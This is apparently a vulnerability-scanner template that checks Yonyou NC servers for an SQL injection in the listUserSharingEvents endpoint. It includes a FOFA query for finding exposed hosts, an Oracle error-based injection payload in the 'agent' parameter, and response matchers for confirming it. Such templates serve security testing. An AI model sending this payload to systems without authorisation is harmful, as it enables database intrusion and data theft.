id: poc-yaml-yongyou-nc-listusersharingevents-sqli
info:
  name: 用友NC listUserSharingEvents SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 用友NC
    fofa: app="用友-UFIDA-NC"
http:
  - method: GET
    path:
      - "/portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=6')+AND+1=UTL_INADDR.GET_HOST_ADDRESS('~'||(chr(112)||chr(113)||chr(113)||chr(120)||chr(122)||chr(112)||chr(113)||chr(112)||chr(113)||chr(113)||chr(120)||chr(122)||chr(112)||chr(113))||'~')--&pageId=login&sch_ed=2&sch_sd=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "nc.bs.dao.DAOException"
          - "未知的主机"
          - "pqqxzpqpqqxzpq"
        part: body
